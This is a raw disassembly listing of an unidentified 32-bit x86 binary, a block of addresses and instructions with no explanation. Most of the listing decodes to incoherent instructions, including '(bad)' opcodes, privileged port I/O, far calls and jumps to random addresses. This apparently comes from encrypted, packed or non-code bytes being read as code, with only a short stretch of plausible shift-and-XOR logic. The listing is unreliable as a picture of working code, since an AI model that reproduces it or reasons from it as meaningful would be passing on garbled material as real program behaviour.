  41c5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5f6:	xor    DWORD PTR [edi+eax*1+0x113a2a5f],ebx
  41c5fd:	push   edx
  41c5fe:	mov    ds,WORD PTR ds:0x70dd1149
  41c604:	pop    esp
  41c605:	add    eax,0x2327e798
  41c60a:	cmp    ah,0x3c
  41c60d:	push   0x1392e292
  41c612:	jo     0x41c661
  41c614:	pop    ebx
  41c615:	jmp    0x4943e3c0
  41c61a:	mov    BYTE PTR [edi-0x68],ch
  41c61d:	xor    BYTE PTR [ecx-0x6da0a406],bl
  41c623:	frstor [esi+0x68]
  41c626:	lea    ebx,[ebx-0x61]
  41c629:	sub    DWORD PTR [ebx+0x34382256],edi
  41c62f:	cld    
  41c630:	fimul  DWORD PTR [ebp-0x7f1b51a2]
  41c636:	push   esi
  41c637:	dec    esi
  41c638:	mov    edi,0x7c482428
  41c63d:	inc    edi
  41c63e:	pop    eax
  41c63f:	addr16 sub al,0x2e
  41c642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c643:	sbb    ah,0xb7
  41c646:	jbe    0x41c6a1
  41c648:	xor    DWORD PTR [edx],0x483c1c07
  41c64e:	cmp    DWORD PTR [edi],0x5d
  41c651:	std    
  41c652:	out    dx,eax
  41c653:	mov    bl,al
  41c655:	sub    DWORD PTR [ebp+0x4b],esp
  41c658:	or     eax,0x1c56e03f
  41c65d:	sbb    BYTE PTR [edx-0x26],cl
  41c660:	push   ebx
  41c661:	pop    eax
  41c662:	aam    0xe9
  41c664:	leave  
  41c665:	xchg   ebp,ebx
  41c667:	xor    edx,DWORD PTR [edx+0x40622fb2]
  41c66d:	and    eax,0x40cf9c63
  41c672:	xchg   esp,eax
  41c673:	inc    esi
  41c674:	ins    DWORD PTR es:[edi],dx
  41c675:	icebp  
  41c676:	(bad)  
  41c678:	cmp    DWORD PTR [esi],edx
  41c67a:	mov    fs,WORD PTR gs:[ecx+0x6e]
  41c67e:	sub    DWORD PTR [edi+0x2e112df3],ebx
  41c684:	popw   es
  41c686:	mov    ebp,0x4ada08cc
  41c68b:	push   eax
  41c68c:	loop   0x41c64b
  41c68e:	sahf   
  41c68f:	or     dh,0xaa
  41c692:	xchg   DWORD PTR [edi+0x5f7f074],ebx
  41c698:	jmp    0xa7f26db6
  41c69d:	sar    BYTE PTR [eax-0xd],cl
  41c6a0:	add    bh,BYTE PTR [edx+0x34b68d6d]
  41c6a6:	cmp    eax,0xc62d5ec1
  41c6ab:	adc    al,0xd0
  41c6ad:	sbb    eax,0xd73855f3
  41c6b2:	inc    eax
  41c6b3:	inc    ebx
  41c6b4:	fadd   DWORD PTR [edi-0x5b5c3532]
  41c6ba:	std    
  41c6bb:	test   al,0xad
  41c6bd:	in     eax,0x9d
  41c6bf:	push   ds
  41c6c0:	xor    DWORD PTR [eax+0x2965f04a],edi
  41c6c6:	or     al,0x6c
  41c6c8:	(bad)  gs:[esi]
  41c6cb:	dec    esi
  41c6cc:	sbb    eax,0x344a6c2
  41c6d1:	test   BYTE PTR [edi+0x4a],al
  41c6d4:	sbb    bh,BYTE PTR [eax-0x4]
  41c6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6d8:	hlt    
  41c6d9:	mov    ecx,0x15ff3af8
  41c6de:	(bad)  
  41c6df:	sar    BYTE PTR [eax+0x6c2bea05],cl
  41c6e5:	loop   0x41c6f1
  41c6e7:	in     eax,dx
  41c6e8:	push   es
  41c6e9:	stc    
  41c6ea:	retf   
  41c6eb:	inc    esi
  41c6ec:	jb     0x41c67c
  41c6ee:	or     eax,0x301d4df4
  41c6f3:	retf   0xf337
  41c6f6:	sub    BYTE PTR [ecx-0x17],cl
  41c6f9:	push   ecx
  41c6fa:	or     eax,eax
  41c6fc:	mov    ds:0xeacff6a,al
  41c701:	in     al,0xcd
  41c703:	mov    ecx,0x32402123
  41c708:	fmul   QWORD PTR [edi]
  41c70a:	fst    QWORD PTR [ecx+eiz*8-0x56]
  41c70e:	fcomp  QWORD PTR [esi-0x18]
  41c711:	sbb    ebp,edx
  41c713:	pushf  
  41c714:	rcl    BYTE PTR [ecx],1
  41c716:	dec    edx
  41c717:	or     cl,dh
  41c719:	sbb    BYTE PTR [esi+0x13],dl
  41c71c:	xchg   esi,eax
  41c71d:	addr16 jb 0x41c76a
  41c720:	int3   
  41c721:	jmp    0x4c1d16b5
  41c726:	test   eax,0x678f194f
  41c72b:	and    DWORD PTR [eax],ecx
  41c72d:	or     al,ah
  41c72f:	icebp  
  41c730:	mov    WORD PTR [ecx-0x40],ds
  41c733:	int3   
  41c734:	leave  
  41c735:	outs   dx,BYTE PTR ds:[esi]
  41c736:	dec    ebp
  41c737:	and    BYTE PTR [esi+ebp*4+0x12],0xf3
  41c73c:	aas    
  41c73d:	or     BYTE PTR [eax],dh
  41c73f:	sbb    eax,0x28706a30
  41c744:	fiadd  WORD PTR [ecx+0x7f]
  41c747:	inc    eax
  41c748:	int    0xea
  41c74a:	icebp  
  41c74b:	inc    ebp
  41c74c:	cs aad 0xb1
  41c74f:	or     eax,0xa25c1cf2
  41c754:	sub    al,0xdb
  41c756:	test   eax,edi
  41c758:	rcr    ebp,1
  41c75a:	stc    
  41c75b:	cmp    al,0xdf
  41c75d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c75e:	inc    esi
  41c75f:	inc    ecx
  41c760:	mov    eax,ds:0x12633190
  41c765:	loope  0x41c7a8
  41c767:	ja     0x41c6f7
  41c769:	mov    DWORD PTR [ebp-0x7db1cfb5],ebp
  41c76f:	ds pop es
  41c771:	pusha  
  41c772:	and    cl,BYTE PTR [esi-0x702ebfaf]
  41c778:	push   esi
  41c779:	(bad)  
  41c77a:	int3   
  41c77b:	std    
  41c77c:	mov    DWORD PTR [eax-0x19],eax
  41c77f:	dec    ebx
  41c780:	bound  eax,QWORD PTR [edx+0x161123df]
  41c786:	test   al,0xc4
  41c788:	pop    edx
  41c789:	shl    DWORD PTR [edi+0x798254c9],0x46
  41c790:	xchg   ebp,eax
  41c791:	int3   
  41c792:	push   esi
  41c793:	pop    ss
  41c794:	ja     0x41c7cc
  41c796:	sub    eax,0x44bbad6f
  41c79b:	sar    edx,0x83
  41c79e:	(bad)
  41c7a1:	jle    0x41c72c
  41c7a3:	mov    dh,0xd1
  41c7a5:	pop    edi
  41c7a6:	jmp    0x45e15e13
  41c7ab:	ja     0x41c7c5
  41c7ad:	enter  0x546f,0xf3
  41c7b1:	dec    eax
  41c7b2:	inc    esi
  41c7b3:	in     al,0x89
  41c7b5:	jle    0x41c7b9
  41c7b7:	xchg   edx,eax
  41c7b8:	pop    DWORD PTR [ebp+0x7d1dd204]
  41c7be:	mov    ecx,0xa86a83a1
  41c7c3:	pop    edi
  41c7c4:	out    0xdc,al
  41c7c6:	adc    ebx,eax
  41c7c8:	xchg   BYTE PTR [eax-0x9],cl
  41c7cb:	iret   
  41c7cc:	lds    esp,FWORD PTR [ebx+0x3f]
  41c7cf:	jnp    0x41c787
  41c7d1:	in     al,dx
  41c7d2:	fstp   QWORD PTR cs:[ecx]
  41c7d5:	sbb    DWORD PTR [edx-0x49],esp
  41c7d8:	jb     0x41c80f
  41c7da:	mov    eax,ds:0x57084b7f
  41c7df:	jp     0x41c7ed
  41c7e1:	sub    eax,0x34ce425d
  41c7e6:	xchg   DWORD PTR [edi-0x48ebe468],ebp
  41c7ec:	mov    ah,0x9
  41c7ee:	jb     0x41c7db
  41c7f0:	hlt    
  41c7f1:	mov    eax,ds:0xa9c25e84
  41c7f6:	and    BYTE PTR [edi],0x2a
  41c7f9:	mov    ebp,0x4c5136b5
  41c7fe:	retf   0xeccf
  41c801:	inc    ebp
  41c802:	(bad)  
  41c803:	ja     0x41c829
  41c805:	sar    DWORD PTR [edx+0x280bf26d],cl
  41c80b:	(bad)  
  41c80d:	pop    ecx
  41c80e:	repz sbb esi,ebx
  41c811:	scas   eax,DWORD PTR es:[edi]
  41c812:	mov    eax,ds:0x3edd39
  41c817:	(bad)  
  41c818:	sub    edi,DWORD PTR [ebp+0x44]
  41c81b:	inc    esi
  41c81c:	sbb    esp,DWORD PTR [esi+0x43]
  41c81f:	leave  
  41c820:	int3   
  41c821:	xchg   ebx,eax
  41c822:	add    ecx,DWORD PTR [edx-0x14f1f5c6]
  41c828:	and    eax,0x84fdffcd
  41c82d:	sar    DWORD PTR [ebp+0x5cac7f20],cl
  41c833:	sbb    ebp,DWORD PTR [eax-0x2b]
  41c836:	retf   0xef63
  41c839:	dec    ebp
  41c83a:	fdiv   QWORD PTR [edi+0x396fa478]
  41c840:	push   ecx
  41c841:	push   esp
  41c842:	loop   0x41c843
  41c844:	add    al,0xf6
  41c846:	mov    eax,ds:0x2d7fc7a4
  41c84b:	xor    eax,0xf978f67
  41c850:	add    BYTE PTR [eax],ah
  41c852:	jae    0x41c7fb
  41c854:	push   ss
  41c855:	pop    ebx
  41c856:	pop    esp
  41c857:	or     eax,0xc3d54a94
  41c85c:	addr16 popa 
  41c85e:	(bad)  
  41c85f:	es pushf 
  41c861:	push   0xc
  41c863:	sbb    eax,0xd6e3528b
  41c868:	dec    esp
  41c869:	jne    0x41c88f
  41c86b:	and    edi,DWORD PTR [edx-0x5d693371]
  41c871:	cmp    ch,BYTE PTR [edx]
  41c873:	push   edx
  41c874:	xor    al,0x1b
  41c876:	popf   
  41c877:	or     eax,0xa4055780
  41c87c:	in     al,dx
  41c87d:	cmp    ebp,DWORD PTR [eax]
  41c87f:	xchg   edi,eax
  41c880:	xor    BYTE PTR [esi-0x80],ah
  41c883:	and    bl,BYTE PTR [edx]
  41c885:	out    dx,eax
  41c886:	or     bl,BYTE PTR [ebp-0x1]
  41c889:	je     0x41c8af
  41c88b:	je     0x41c88c
  41c88d:	je     0x41c8b3
  41c88f:	je     0x41c890
  41c891:	je     0x41c8b7
  41c893:	and    al,0xff
  41c895:	je     0x41c8bb
  41c897:	and    al,0xe8
  41c899:	imul   edx,DWORD PTR [ecx+0x548bffff],0x448b1824
  41c8a3:	and    al,0x1c
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	call   0x166b:0xef709dca
  41c942:	sbb    BYTE PTR [edx+edx*1+0x18771818],bh
  41c949:	and    BYTE PTR [eax],dh
  41c94b:	pop    esi
  41c94c:	push   0xffffffe7
  41c94e:	lods   al,BYTE PTR ds:[esi]
  41c94f:	addr16 pop ecx
  41c951:	sub    dh,bl
  41c953:	in     eax,dx
  41c954:	xchg   esi,eax
  41c955:	bound  esi,QWORD PTR [edi]
  41c957:	mov    WORD PTR [ebp-0x3fdc4da2],gs
  41c95d:	fdiv   DWORD PTR [esi-0x666a1b04]
  41c963:	iret   
  41c964:	iret   
  41c965:	pushf  
  41c966:	cli    
  41c967:	(bad)  
  41c968:	pop    ss
  41c969:	jo     0x41c92a
  41c96b:	ja     0x41c9c1
  41c96d:	in     eax,0xd4
  41c96f:	lods   al,BYTE PTR ds:[esi]
  41c970:	cdq    
  41c971:	mov    ?,WORD PTR [esp+edi*2+0x1ef66933]
  41c978:	lods   eax,DWORD PTR ds:[esi]
  41c979:	add    DWORD PTR [edi-0x5],0xe1bd3e3c
  41c980:	inc    esp
  41c981:	mov    edx,DWORD PTR [edx]
  41c983:	aaa    
  41c984:	dec    esp
  41c985:	sbb    DWORD PTR [esi-0x12],esi
  41c988:	xor    eax,0x5057e0ef
  41c98d:	jg     0x41c961
  41c98f:	dec    esi
  41c990:	jge    0x41c9e2
  41c992:	adc    dh,0x20
  41c995:	push   ebx
  41c996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c997:	sahf   
  41c998:	mov    esi,0xa3c90af4
  41c99d:	jo     0x41c9fa
  41c99f:	xchg   ecx,eax
  41c9a0:	into   
  41c9a1:	sti    
  41c9a2:	mov    ebp,ecx
  41c9a4:	mov    WORD PTR [esi-0x2e409388],?
  41c9aa:	sub    dl,bl
  41c9ac:	adc    esp,DWORD PTR [eax+eax*2-0x5f]
  41c9b0:	arpl   ax,bp
  41c9b2:	push   esp
  41c9b3:	scas   al,BYTE PTR es:[edi]
  41c9b4:	xlat   BYTE PTR ds:[ebx]
  41c9b5:	ja     0x41c97a
  41c9b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9b8:	push   ecx
  41c9b9:	jae    0x41c98e
  41c9bb:	xor    dl,BYTE PTR ds:0x78bb3f0a
  41c9c1:	cmp    eax,0x4a653174
  41c9c6:	std    
  41c9c7:	mov    edi,0xfe01663d
  41c9cc:	fiadd  WORD PTR [ebx+0xb]
  41c9cf:	inc    edi
  41c9d0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41c9d2:	loop   0x41c99b
  41c9d4:	or     dh,BYTE PTR [edx+0x1097e16d]
  41c9da:	xchg   esp,eax
  41c9db:	ja     0x41c984
  41c9dd:	sub    eax,0x2d94305a
  41c9e2:	or     eax,0xaa049a55
  41c9e7:	push   ds
  41c9e8:	xchg   esi,eax
  41c9e9:	test   al,0xd9
  41c9eb:	inc    esi
  41c9ec:	cmp    al,0x9e
  41c9ee:	loopne 0x41ca1d
  41c9f0:	pshufw mm3,mm2,0xc8
  41c9f4:	sub    BYTE PTR [ebx-0x416bed9b],ch
  41c9fa:	push   ebx
  41c9fb:	mov    esi,DWORD PTR [eax+esi*2+0x7b]
  41c9ff:	cdq    
  41ca00:	hlt    
  41ca01:	fisub  WORD PTR [ebx]
  41ca03:	call   0xfb3e7d17
  41ca08:	push   esp
  41ca09:	imul   ecx,DWORD PTR gs:[esp-0x54d279ea],0x43
  41ca12:	stc    
  41ca13:	push   esi
  41ca14:	or     al,0x7b
  41ca16:	jecxz  0x41ca79
  41ca18:	adc    eax,0x9f11618a
  41ca1d:	out    dx,al
  41ca1e:	mov    bl,0x43
  41ca20:	lock sbb BYTE PTR [ebx-0x48923a9f],bl
  41ca27:	cdq    
  41ca28:	es xchg ebx,eax
  41ca2a:	push   ss
  41ca2b:	mov    esp,edx
  41ca2d:	dec    edi
  41ca2e:	mov    eax,ds:0x5304dff3
  41ca33:	adc    al,BYTE PTR [edi+0x4cdbafe6]
  41ca39:	or     DWORD PTR [edx],esp
  41ca3b:	es sub eax,0x28f39f75
  41ca41:	jmp    0x41c9e0
  41ca43:	add    al,0x6e
  41ca45:	xlat   BYTE PTR ds:[ebx]
  41ca46:	push   esp
  41ca47:	fisub  DWORD PTR [esi-0x4e]
  41ca4a:	in     eax,0xcf
  41ca4c:	pop    edi
  41ca4d:	sbb    esp,esp
  41ca4f:	cmp    al,0x6f
  41ca51:	dec    edi
  41ca52:	and    dl,BYTE PTR [esi]
  41ca54:	pop    esi
  41ca55:	ror    BYTE PTR [edi],1
  41ca57:	or     ch,ch
  41ca59:	sub    BYTE PTR [eax+edi*4],ch
  41ca5c:	aaa    
  41ca5d:	jp     0x41caa6
  41ca5f:	call   0xa61a:0x6b16170b
  41ca66:	jne    0x41caa2
  41ca68:	xor    BYTE PTR ds:0x747a9f71,0x7e
  41ca6f:	cmp    al,0xd6
  41ca71:	sbb    al,0xbb
  41ca73:	imul   edx,DWORD PTR [ebx+0xd],0x8cc4e04c
  41ca7a:	fcom   DWORD PTR [esi+0x29]
  41ca7d:	(bad)
  41ca81:	or     al,0xf1
  41ca83:	jns    0x41ca35
  41ca85:	popf   
  41ca86:	inc    ebx
  41ca87:	or     al,0x4a
  41ca89:	xchg   ecx,eax
  41ca8a:	push   esp
  41ca8b:	jne    0x41cab0
  41ca8d:	jl     0x41ca64
  41ca8f:	mov    al,0xee
  41ca91:	mov    ebx,0xc0fb875b
  41ca96:	add    al,0x78
  41ca98:	jcxz   0x41ca3f
  41ca9b:	mov    edx,0xddceb912
  41caa0:	pusha  
  41caa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caa2:	xlat   BYTE PTR ds:[ebx]
  41caa3:	add    BYTE PTR [eax],0x6
  41caa6:	jb     0x41ca4d
  41caa8:	jbe    0x41cad1
  41caaa:	(bad)  
  41caab:	ret    0xd87e
  41caae:	mov    al,0x6f
  41cab0:	fwait
  41cab1:	jb     0x41ca9d
  41cab3:	adc    eax,0x3180f5db
  41cab8:	xchg   ecx,eax
  41cab9:	fsub   st(5),st
  41cabb:	or     DWORD PTR [edi],edi
  41cabd:	shr    edx,1
  41cabf:	add    DWORD PTR [ebp-0x3b872177],ebx
  41cac5:	mov    ah,0xdf
  41cac7:	ja     0x41cadd
  41cac9:	test   al,0xe5
  41cacb:	push   ebx
  41cacc:	or     al,0xe7
  41cace:	std    
  41cacf:	aaa    
  41cad0:	jl     0x41cac6
  41cad2:	lahf   
  41cad3:	pop    ecx
  41cad4:	fmul   QWORD PTR [ebp+0x6a6924cb]
  41cada:	ds aam 0x7d
  41cadd:	icebp  
  41cade:	jbe    0x41caeb
  41cae0:	cmp    dh,ah
  41cae2:	out    dx,al
  41cae3:	and    esi,edx
  41cae5:	int    0xfc
  41cae7:	pop    esp
  41cae8:	fnstsw WORD PTR [edx]
  41caea:	out    dx,al
  41caeb:	call   0xcb9a0e1f
  41caf0:	mov    bh,0x5f
  41caf2:	pop    esi
  41caf3:	pop    DWORD PTR [ecx]
  41caf5:	retf   0xaa2b
  41caf8:	shl    BYTE PTR ds:0xcc7f6972,cl
  41cafe:	adc    al,0xe0
  41cb00:	jg     0x41cb2c
  41cb02:	hlt    
  41cb03:	mov    ebp,0xc3ed301e
  41cb08:	mov    ebp,0x3d735123
  41cb0d:	mov    eax,ds:0xdc3f2734
  41cb12:	fld    QWORD PTR [edi-0xf2cd24e]
  41cb18:	xor    ebp,ecx
  41cb1a:	push   esp
  41cb1b:	xchg   DWORD PTR [ecx+0x229e190b],esi
  41cb21:	sub    esp,DWORD PTR [edx-0x3dd9115e]
  41cb27:	xor    dh,al
  41cb29:	call   0x487a41b2
  41cb2e:	and    edi,edx
  41cb30:	pop    ebx
  41cb31:	int3   
  41cb32:	xchg   ecx,eax
  41cb33:	fidiv  DWORD PTR [eax+ecx*4+0x100e7bca]
  41cb3a:	add    BYTE PTR [edx-0x1],dh
  41cb3d:	(bad)  
  41cb3e:	inc    ecx
  41cb3f:	sahf   
  41cb40:	sbb    DWORD PTR [ecx+0x16bedd2f],eax
  41cb46:	inc    ecx
  41cb47:	inc    ecx
  41cb48:	daa    
  41cb49:	cmp    eax,0x326884a1
  41cb4e:	(bad)  
  41cb4f:	sub    eax,0x9de9bbfc
  41cb54:	inc    ebp
  41cb55:	loopne 0x41cb0b
  41cb57:	push   ecx
  41cb58:	test   BYTE PTR [edx],ch
  41cb5a:	dec    ecx
  41cb5b:	mov    eax,DWORD PTR [ebp+0x28]
  41cb5e:	and    al,0x4
  41cb60:	data16 sbb BYTE PTR [ebx-0x78],0xd5
  41cb65:	add    edi,DWORD PTR [ecx-0x1636d6d6]
  41cb6b:	mov    dh,0x68
  41cb6d:	mov    esi,DWORD PTR [ecx*8+0x682d541b]
  41cb74:	adc    al,0x24
  41cb76:	ins    DWORD PTR es:[edi],dx
  41cb77:	push   0xcb6f3ce7
  41cb7c:	cmp    BYTE PTR [edi-0x33],bl
  41cb7f:	mov    al,ds:0x75833361
  41cb84:	xor    DWORD PTR [ebp+0xaf55a29],esp
  41cb8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb8b:	mov    bh,0xdb
  41cb8d:	imul   edx,DWORD PTR [ebp-0x33],0xfffffff0
  41cb91:	or     BYTE PTR [ecx],ah
  41cb93:	adc    DWORD PTR [ebp+0x62],ecx
  41cb96:	mov    DWORD PTR [edi+0x7cdbe5ce],eax
  41cb9c:	mov    ch,0x89
  41cb9e:	sub    DWORD PTR [esi],edx
  41cba0:	or     eax,0x36331e81
  41cba5:	pushf  
  41cba6:	out    dx,eax
  41cba7:	lods   eax,DWORD PTR ds:[esi]
  41cba8:	sbb    bl,bl
  41cbaa:	(bad)  
  41cbac:	inc    ebx
  41cbad:	jns    0x41cb9f
  41cbaf:	pop    edi
  41cbb0:	repz pusha 
  41cbb2:	mov    ecx,0x6ed09876
  41cbb7:	jp     0x41cb51
  41cbb9:	mov    edx,0xd111bda3
  41cbbe:	repnz pop ds
  41cbc0:	repnz cwde 
  41cbc2:	(bad)
  41cbc6:	cmp    ebp,DWORD PTR [ebp+ebp*4-0x24fc793d]
  41cbcd:	fistp  QWORD PTR [ecx+0x1af88fca]
  41cbd3:	shl    DWORD PTR [ebp+0x39],1
  41cbd6:	rol    BYTE PTR [esi-0x13168c9],cl
  41cbdc:	mov    bl,0x34
  41cbde:	sti    
  41cbdf:	enter  0xd5d5,0x96
  41cbe3:	aas    
  41cbe4:	jae    0x41cbc6
  41cbe6:	dec    ecx
  41cbe7:	push   ss
  41cbe8:	lods   al,BYTE PTR ds:[esi]
  41cbe9:	shl    DWORD PTR [ebx],cl
  41cbeb:	mov    ebx,0xf22be4ea
  41cbf0:	add    edx,DWORD PTR [edi-0x72]
  41cbf3:	push   ecx
  41cbf4:	call   0x66a25b35
  41cbf9:	jle    0x41cc5b
  41cbfb:	cmc    
  41cbfc:	mov    edx,DWORD PTR [eax-0x9]
  41cbff:	das    
  41cc00:	test   BYTE PTR [ebp-0x6f],ah
  41cc03:	and    bh,bh
  41cc05:	inc    esp
  41cc06:	test   BYTE PTR ds:0xec4f905,al
  41cc0c:	mov    esp,0xd26d284f
  41cc11:	lahf   
  41cc12:	add    BYTE PTR [eax-0x33339397],cl
  41cc18:	xchg   BYTE PTR [eax-0x80],bh
  41cc1b:	call   0x376c:0x9a6635e7
  41cc22:	fidivr WORD PTR [edi-0x25b23b3c]
  41cc28:	jne    0x41cc5d
  41cc2a:	push   ebx
  41cc2b:	sbb    eax,0x124b7bd4
  41cc30:	and    DWORD PTR es:[eax+0x1e],ebp
  41cc34:	bound  ebx,QWORD PTR [edi-0x38f303f9]
  41cc3a:	aam    0x11
  41cc3c:	inc    ecx
  41cc3d:	push   ss
  41cc3e:	call   0xa3cf77f7
  41cc43:	jl     0x41cbf5
  41cc45:	and    bl,0xd9
  41cc48:	call   0xc5014150
  41cc4d:	enter  0xb356,0xe4
  41cc51:	jae    0x41cc53
  41cc53:	test   BYTE PTR [ebx],dl
  41cc55:	stos   DWORD PTR es:[edi],eax
  41cc56:	inc    ebp
  41cc57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc58:	dec    ecx
  41cc59:	or     al,0xde
  41cc5b:	push   esi
  41cc5c:	xor    ecx,esp
  41cc5e:	push   es
  41cc5f:	and    BYTE PTR [edx+0x74],bh
  41cc62:	nop
  41cc63:	das    
  41cc64:	xchg   ebp,eax
  41cc65:	jmp    0x30dd:0xb3d68f2
  41cc6c:	pop    es
  41cc6d:	repnz mov dh,0xad
  41cc70:	jg     0x41ccda
  41cc72:	and    esp,DWORD PTR [edi+0x175375a9]
  41cc78:	sar    edx,cl
  41cc7a:	mov    ch,0x41
  41cc7c:	popa   
  41cc7d:	jecxz  0x41cc6c
  41cc7f:	ret    0xfcb
  41cc82:	scas   eax,DWORD PTR es:[edi]
  41cc83:	loopne 0x41cc25
  41cc85:	push   ebx
  41cc86:	inc    esi
  41cc87:	call   FWORD PTR [eax]
  41cc89:	test   BYTE PTR [eax],dh
  41cc8b:	jmp    0x41cc2d
  41cc8d:	dec    ebp
  41cc8e:	daa    
  41cc8f:	sub    edi,edx
  41cc91:	popa   
  41cc92:	fld    DWORD PTR [ebp-0x33]
  41cc95:	sbb    bh,cl
  41cc97:	or     eax,0xb0c5308f
  41cc9c:	fidiv  DWORD PTR [eax]
  41cc9e:	or     eax,0x5d06aa2f
  41cca3:	sbb    eax,0xfa269360
  41cca8:	pop    ebx
  41cca9:	lds    edi,FWORD PTR [ecx-0x1d3d6c71]
  41ccaf:	popf   
  41ccb0:	mov    dl,0xf8
  41ccb2:	lods   al,BYTE PTR ds:[esi]
  41ccb3:	mov    edx,0x245b3c91
  41ccb8:	cdq    
  41ccb9:	or     DWORD PTR [ecx],ebx
  41ccbb:	fcom   st(2)
  41ccbd:	jle    0x41cd26
  41ccbf:	ds mov ebx,0x9461880f
  41ccc5:	mov    esp,0x3ab61c92
  41ccca:	jl     0x41cc58
  41cccc:	loope  0x41cd46
  41ccce:	les    ecx,FWORD PTR [ecx+0x53]
  41ccd1:	lock pop ecx
  41ccd3:	xchg   esi,eax
  41ccd4:	push   edi
  41ccd5:	mov    cl,0x56
  41ccd7:	outs   dx,DWORD PTR ds:[esi]
  41ccd8:	xor    DWORD PTR [edx+0x4218668d],edx
  41ccde:	fwait
  41ccdf:	outs   dx,BYTE PTR ds:[esi]
  41cce0:	xchg   ebp,eax
  41cce1:	cmp    BYTE PTR [ecx-0x3c],al
  41cce4:	adc    BYTE PTR [edx-0x501b1e87],dl
  41ccea:	jb     0x41cd62
  41ccec:	dec    ebx
  41cced:	pop    esp
  41ccee:	bound  ebx,QWORD PTR [eax+edi*2]
  41ccf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccf2:	or     cl,BYTE PTR [eax]
  41ccf4:	push   cs
  41ccf5:	inc    sp
  41ccf7:	jb     0x41cd5d
  41ccf9:	mov    cl,BYTE PTR [esp+0x3c]
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0xb06b2a42
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1-0x68e7e7e8],bh
  41cd1e:	addr16 das 
  41cd20:	jb     0x41cd04
  41cd22:	repz jecxz 0x41cd4a
  41cd25:	add    bl,BYTE PTR [edi+ebx*2+0x2d89e319]
  41cd2c:	add    al,BYTE PTR [esi-0x296a69ed]
  41cd32:	add    al,BYTE PTR [esi+0x164ce8df]
  41cd38:	test   al,0xdb
  41cd3b:	(bad)
  41cd3e:	bnd jae 0x41cd27
  41cd41:	dec    ecx
  41cd42:	test   DWORD PTR [edi-0x7f],ebp
  41cd45:	stos   BYTE PTR es:[edi],al
  41cd46:	pusha  
  41cd47:	mov    edi,0x8be47099
  41cd4c:	lock cli 
  41cd4e:	push   esp
  41cd4f:	sahf   
  41cd50:	add    esi,DWORD PTR [edx+0x1d]
  41cd53:	daa    
  41cd54:	repz cs push cs
  41cd57:	and    ebp,DWORD PTR [ebx+0x4e]
  41cd5a:	stc    
  41cd5b:	les    edi,FWORD PTR [ebx+0x77]
  41cd5e:	(bad)  
  41cd5f:	xchg   esi,eax
  41cd60:	sbb    edx,esi
  41cd62:	and    eax,0x7033dc93
  41cd67:	data16 int3 
  41cd69:	sub    ebp,ebx
  41cd6b:	mov    al,ds:0x1372f94c
  41cd70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd71:	fnstenv [ecx-0x43]
  41cd74:	pop    es
  41cd75:	push   0xfffffff8
  41cd77:	fisttp WORD PTR [ecx-0x235b3cc0]
  41cd7d:	xchg   ebx,eax
  41cd7e:	nop
  41cd7f:	inc    ebx
  41cd80:	mov    BYTE PTR [eax],bl
  41cd82:	jmp    0xb2e5a424
  41cd87:	sar    DWORD PTR [ecx],cl
  41cd89:	xchg   ebx,eax
  41cd8a:	push   ss
  41cd8b:	push   ebp
  41cd8c:	mov    ah,0xcd
  41cd8e:	mov    DWORD PTR [esp+eax*4+0x78],edx
  41cd92:	fsub   QWORD PTR [edx-0x3a]
  41cd96:	stos   BYTE PTR es:[edi],al
  41cd97:	ret    
  41cd98:	into   
  41cd99:	daa    
